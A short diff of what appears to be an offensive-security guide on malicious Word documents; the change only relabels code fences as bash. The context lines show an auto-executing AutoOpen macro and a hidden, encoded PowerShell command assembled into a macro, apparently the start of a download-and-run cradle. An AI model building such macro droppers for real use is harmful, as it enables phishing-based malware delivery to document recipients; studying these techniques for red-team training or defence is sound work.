@@ -32,7 +32,7 @@ Create a `.docm` or `.doc` Microsoft Word document and create a new macro.
 {: .important }
 > Macros are not enabled in `.docx` documents.
 
-```
+```bash
 ' Macro is automatically executed when the document is opened '
 Sub AutoOpen()
     MyMacro
@@ -77,7 +77,7 @@ for i in range(0, len(str), n):
 
 Then, add the result into the macro.
 
-```
+```bash
 Sub MyMacro()
     Dim Str As String
 		Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
